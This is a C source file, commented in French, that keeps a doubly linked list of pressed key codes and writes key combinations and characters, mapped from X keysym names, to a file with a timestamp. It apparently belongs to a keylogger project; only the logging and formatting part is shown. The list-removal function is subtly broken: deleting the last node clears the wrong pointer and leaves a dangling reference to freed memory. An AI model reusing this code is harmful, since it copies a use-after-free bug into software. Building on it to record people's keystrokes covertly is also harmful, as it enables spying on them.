#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "liste.h"
#include <time.h>
#include "main.h"

//ajoute elem a la liste
extern void ajoute(struct liste **maliste,int elem){//fonctionne
	
	struct liste *newliste = (struct liste *) malloc(sizeof(struct liste));
		newliste->elem=elem; 
		newliste->suivant=*maliste; 
		newliste->precedent=NULL;

	if (*maliste != NULL){
		(*maliste)->precedent=newliste;
		*maliste=newliste;
	}
	else 
		*maliste=newliste;
}

//supprime elem de la liste
extern void supprime(struct liste **maliste,int elem){
	struct liste *ptr=*maliste;
	while(ptr!=NULL){
		if (elem==ptr->elem){
			if (ptr->precedent==NULL && ptr->suivant==NULL){
				(*maliste)=NULL;
				free(ptr);
			}
			else if (ptr->precedent==NULL){
				ptr->suivant->precedent=NULL;
				*maliste=ptr->suivant;
				free(ptr);
			}
			else if (ptr->suivant==NULL){
				ptr->precedent->precedent=NULL;
				free(ptr);
			}
			else{
				ptr->precedent->suivant=ptr->suivant;
				ptr->suivant->precedent=ptr->precedent;
				free(ptr);
			}
			fflush(stdout);
			break;
		}
		else 
			ptr=ptr->suivant;
	}
}


int taille_liste(struct liste *maliste){
	int accu = 0 ;
	struct liste *ptr=maliste;
	while(ptr!=NULL){
		accu++;
		ptr=ptr->suivant;
	}
	return accu;
}


time_t curtime;
struct tm date;
char buff[40];
//ne prend que des listes de longueur au moins2 et renvoie 0 si la liste n'est pas: ** ->ALtgr|Shift et 1 si shift et 2si altgr
 int est_lettres_combi(char keymap[][3][TAILLE_BUFF],struct liste *maliste){
	if ( strncmp("Shift",keymap[maliste->suivant->elem][0],5)==0 ) return 1;
	else if (strncmp("ISO_Level3_Shift",keymap[maliste->suivant->elem][0],16)==0) return 2;
	else return 0;
}


//affiche une liste
void fprintliste(struct liste *maliste,FILE *fichier,char keymap[][3][TAILLE_BUFF]){ //fonctionne
	struct liste *ptr=maliste;
	int g;

	if (taille_liste(maliste)==1)
		fprintelem(ptr->elem,keymap,fichier,0);

	else if (taille_liste(maliste)==2 && (g=est_lettres_combi(keymap,maliste)))
			fprintelem(ptr->elem,keymap,fichier,g); 
	else{
		while(ptr!=NULL && ptr->suivant!=NULL){
				fprintf(fichier,"%s ++ ",keymap[ptr->suivant->elem][0]);
				ptr=ptr->suivant;
		}
		fprintf(fichier,"%s",keymap[maliste->elem][0]);
	}
	time(&curtime);
	date=*localtime(&curtime);
	strftime(buff,40,"%x %X",&date);
	fprintf(fichier," %s\n",buff);
}

//type dit, c'est une combinaison de touche, si type = 0 c'est premier choix
//si type = 1 c'est Shift et si type = 2 c'est altgr
//Attention pas sur ques les noms des characteres speciaux fonctionnent avec tous les claviers
void fprintelem(int num, char keymap[][3][TAILLE_BUFF],FILE *fichier,int type){
	if(strcmp(keymap[num][type],"apostrophe")==0)
		fprintf(fichier,"\'");
	else if(strcmp(keymap[num][type],"ampersand")==0)
		fprintf(fichier,"&");
	else if(strcmp(keymap[num][type],"eacute")==0)
		fprintf(fichier,"é");
	else if(strcmp(keymap[num][type],"quotedbl")==0)
		fprintf(fichier,"\"");
	else if(strcmp(keymap[num][type],"parenleft")==0)
		fprintf(fichier,"(");
	else if(strcmp(keymap[num][type],"minus")==0)
		fprintf(fichier,"-");
	else if(strcmp(keymap[num][type],"egrave")==0)
		fprintf(fichier,"è");
	else if(strcmp(keymap[num][type],"underscore")==0)
		fprintf(fichier,"_");
	else if(strcmp(keymap[num][type],"ccedilla")==0)
		fprintf(fichier,"ç");
	else if(strcmp(keymap[num][type],"agrave")==0)
		fprintf(fichier,"à");
	else if(strcmp(keymap[num][type],"parenright")==0)
		fprintf(fichier,")");
	else if(strcmp(keymap[num][type],"equal")==0)
		fprintf(fichier,"=");
	else if(strcmp(keymap[num][type],"asciitilde")==0)
		fprintf(fichier,"~");
	else if(strcmp(keymap[num][type],"numbersign")==0)
		fprintf(fichier,"#");
	else if(strcmp(keymap[num][type],"braceleft")==0)
		fprintf(fichier,"{");
	else if(strcmp(keymap[num][type],"bracketleft")==0)
		fprintf(fichier,"[");
	else if(strcmp(keymap[num][type],"bar")==0)
		fprintf(fichier,"|");
	else if(strcmp(keymap[num][type],"grave")==0)
		fprintf(fichier,"`");
	else if(strcmp(keymap[num][type],"backslash")==0)
		fprintf(fichier,"\\");
	else if(strcmp(keymap[num][type],"asciicircum")==0)
		fprintf(fichier,"^");
	else if(strcmp(keymap[num][type],"at")==0)
		fprintf(fichier,"@");
	else if(strcmp(keymap[num][type],"bracketright")==0)
		fprintf(fichier,"]");
	else if(strcmp(keymap[num][type],"braceright")==0)
		fprintf(fichier,"}");
	else if(strcmp(keymap[num][type],"dollar")==0)
		fprintf(fichier,"$");
	else if(strcmp(keymap[num][type],"sterling")==0)
		fprintf(fichier,"£");
	else if(strcmp(keymap[num][type],"asterisk")==0)
		fprintf(fichier,"*");
	else if(strcmp(keymap[num][type],"mu")==0)
		fprintf(fichier,"µ");
	else if(strcmp(keymap[num][type],"ugrave")==0)
		fprintf(fichier,"ù");
	else if(strcmp(keymap[num][type],"percent")==0)
		fprintf(fichier,"%%");
	else if(strcmp(keymap[num][type],"twosuperior")==0)
		fprintf(fichier,"²");
	else if(strcmp(keymap[num][type],"less")==0)
		fprintf(fichier,"<");
	else if(strcmp(keymap[num][type],"greater")==0)
		fprintf(fichier,">");
	else if(strcmp(keymap[num][type],"comma")==0)
		fprintf(fichier,",");
	else if(strcmp(keymap[num][type],"question")==0)
		fprintf(fichier,"?");
	else if(strcmp(keymap[num][type],"semicolon")==0)
		fprintf(fichier,";");
	else if(strcmp(keymap[num][type],"period")==0)
		fprintf(fichier,".");
	else if(strcmp(keymap[num][type],"colon")==0)
		fprintf(fichier,":");
	else if(strcmp(keymap[num][type],"slash")==0)
		fprintf(fichier,"/");
	else if(strcmp(keymap[num][type],"exclam")==0)
		fprintf(fichier,"!");
	else if(strcmp(keymap[num][type],"KP_Home")==0)
		fprintf(fichier,"7");
	else if(strcmp(keymap[num][type],"KP_Up")==0)
		fprintf(fichier,"8");
	else if(strcmp(keymap[num][type],"KP_Prior")==0)
		fprintf(fichier,"9");
	else if(strcmp(keymap[num][type],"KP_Subtract")==0)
		fprintf(fichier,"-");
	else if(strcmp(keymap[num][type],"KP_Left")==0)
		fprintf(fichier,"4");
	else if(strcmp(keymap[num][type],"KP__Begin")==0)
		fprintf(fichier,"5");
	else if(strcmp(keymap[num][type],"KP_Right")==0)
		fprintf(fichier,"6");
	else if(strcmp(keymap[num][type],"KP_Add")==0)
		fprintf(fichier,"+");
	else if(strcmp(keymap[num][type],"KP_End")==0)
		fprintf(fichier,"1");
	else if(strcmp(keymap[num][type],"KP_Down")==0)
		fprintf(fichier,"2");
	else if(strcmp(keymap[num][type],"KP_Next")==0)
		fprintf(fichier,"3");
	else if(strcmp(keymap[num][type],"KP_Insert")==0)
		fprintf(fichier,"0");
	else if(strcmp(keymap[num][type],"KP_Delete")==0)
		fprintf(fichier,".");
	else if(strcmp(keymap[num][type],"KP_Multiply")==0)
		fprintf(fichier,"*");
	else if(strcmp(keymap[num][type],"KP_Divide")==0)
		fprintf(fichier,"/");
	else if(strcmp(keymap[num][type],"degree")==0)
		fprintf(fichier,"°");
	else if(strcmp(keymap[num][type],"plus")==0)
		fprintf(fichier,"+");
	else fprintf(fichier,"%s",keymap[num][type]);
}
	